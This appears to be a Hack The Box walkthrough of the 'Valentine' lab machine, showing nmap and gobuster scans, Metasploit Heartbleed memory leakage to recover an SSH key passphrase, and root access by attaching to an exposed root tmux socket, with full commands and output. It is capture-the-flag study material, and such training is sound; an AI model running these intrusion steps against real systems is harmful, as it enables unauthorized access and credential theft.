# VALENTINE

## ENUMERATION

Doing nmap scan 

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/valentine]
└─$ nmap 10.10.10.79
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-06 05:16 EDT
Nmap scan report for 10.10.10.79
Host is up (0.11s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 82.06 seconds
                                                                                 
┌──(kali㉿kali)-[~/Downloads/hackthebox/valentine]
└─$ nmap 10.10.10.79 -p 22,80,443 -A
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-06 05:17 EDT
Nmap scan report for 10.10.10.79
Host is up (0.100s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
|_ssl-date: 2021-08-06T09:18:12+00:00; +2s from scanner time.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.29 seconds
```

Running a gobuster scan on the http port 

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/valentine]
└─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.79 -q -t 100
/cgi-bin/             (Status: 403) [Size: 287]
/.htpasswd            (Status: 403) [Size: 288]
/.hta                 (Status: 403) [Size: 283]
/.htaccess            (Status: 403) [Size: 288]
/dev                  (Status: 301) [Size: 308] [--> http://10.10.10.79/dev/]
/decode               (Status: 200) [Size: 552]                              
/encode               (Status: 200) [Size: 554]                              
/index                (Status: 200) [Size: 38]                               
/index.php            (Status: 200) [Size: 38]                               
/server-status        (Status: 403) [Size: 292]   
```
Taking a look at the ```/dev``` directory we find 2 files 

![](https://github.com/Leo-2807/Writeups/blob/main/images/valentine1.png)

Opening the ```hype_key``` file we find some hex encoded text

![](https://github.com/Leo-2807/Writeups/blob/main/images/valentine2.png)

I used [CyberChef](https://gchq.github.io/CyberChef/) to decode it into plaintext

![](https://github.com/Leo-2807/Writeups/blob/main/images/valentine3.png)

Looks like we have found a rsa private key 

Using it with ssh asked me for a passphrase . I tried to get the passphrase using jonh and rockyou.txt but couldn't get it. So that means there has to be another way to find it. 

Now we also have https port open so I thought to check if it was vulnerable to ```heartbleed``` vulnerability

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/valentine]
└─$ nmap -p 443 --script ssl-heartbleed 10.10.10.79
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-06 05:58 EDT
Nmap scan report for 10.10.10.79
Host is up (0.22s latency).

PORT    STATE SERVICE
443/tcp open  https
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|           
|     References:
|       http://www.openssl.org/news/secadv_20140407.txt 
|       http://cvedetails.com/cve/2014-0160/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160

Nmap done: 1 IP address (1 host up) scanned in 1.51 seconds

```
So it is vulnerable

## EXPLOIT

Using metasploit [resource](https://www.ehacking.net/2020/02/how-to-exploit-heartbleed-using-metasploit-in-kali-linux.html)

```
msf6 > search heartbleed

Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   0  auxiliary/server/openssl_heartbeat_client_memory  2014-04-07       normal  No     OpenSSL Heartbeat (Heartbleed) Client Memory Exposure
   1  auxiliary/scanner/ssl/openssl_heartbleed          2014-04-07       normal  Yes    OpenSSL Heartbeat (Heartbleed) Information Leak


Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/ssl/openssl_heartbleed                                                

msf6 > use 1
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > show options

Module options (auxiliary/scanner/ssl/openssl_heartbleed):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   DUMPFILTER                         no        Pattern to filter leaked memory
                                                 before storing
   LEAK_COUNT        1                yes       Number of times to leak memory
                                                per SCAN or DUMP invocation
   MAX_KEYTRIES      50               yes       Max tries to dump key
   RESPONSE_TIMEOUT  10               yes       Number of seconds to wait for a
                                                 server response
   RHOSTS                             yes       The target host(s), range CIDR
                                                identifier, or hosts file with
                                                syntax 'file:<path>'
   RPORT             443              yes       The target port (TCP)
   STATUS_EVERY      5                yes       How many retries until key dump
                                                 status
   THREADS           1                yes       The number of concurrent thread
                                                s (max one per host)
   TLS_CALLBACK      None             yes       Protocol to use, "None" to use
                                                raw TLS sockets (Accepted: None
                                                , SMTP, IMAP, JABBER, POP3, FTP
                                                , POSTGRES)
   TLS_VERSION       1.0              yes       TLS/SSL version to use (Accepte
                                                d: SSLv3, 1.0, 1.1, 1.2)


Auxiliary action:

   Name  Description
   ----  -----------
   SCAN  Check hosts for vulnerability


msf6 auxiliary(scanner/ssl/openssl_heartbleed) > set RHOST 10.10.10.79
RHOST => 10.10.10.79
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > set VERBOSE true
VERBOSE => true
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > exploit
```

Among other useless data we find this string
```$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==```

Decoding the string
```
┌──(kali㉿kali)-[~/Downloads/hackthebox/valentine]
└─$ echo "aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==" | base64 -d
heartbleedbelievethehype
```
Well looks like this is the passphrase for the rsa private key

## SSH

Now the only thing we need is a username 
After trying some common usernames with no result I visited the rsa key file and well the name of the file ```hype_key``` gave me an idea to try ```hype``` as the username

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/valentine]
└─$ ssh -i id_rsa hype@10.10.10.79                                         255 ⨯
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3
hype@Valentine:~$ whoami
hype
hype@Valentine:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
hype@Valentine:~$ locate user.txt
/home/hype/Desktop/user.txt
/usr/share/doc/fontconfig/fontconfig-user.txt.gz
hype@Valentine:~$ cd Desktop
hype@Valentine:~/Desktop$ ls
user.txt
```

And we are able to retrive the user flag

## USER --> ROOT

I ran linpeas to check for privelge escalation vulnerbilities

```
root       1020  0.0  0.1  26416  1676 ?        Ss   Aug05   0:10 /usr/bin/tmux -S /.devs/dev_sess
```
This is what we find and well let's use this command

```
hype@Valentine:~/Desktop$ /usr/bin/tmux -S /.devs/dev_sess
```
And it worked

```
root@Valentine:/home/hype/Desktop# whoami
root
root@Valentine:/home/hype/Desktop# cd /root
root@Valentine:~# ls
curl.sh  root.txt
root@Valentine:~# cat root.txt
```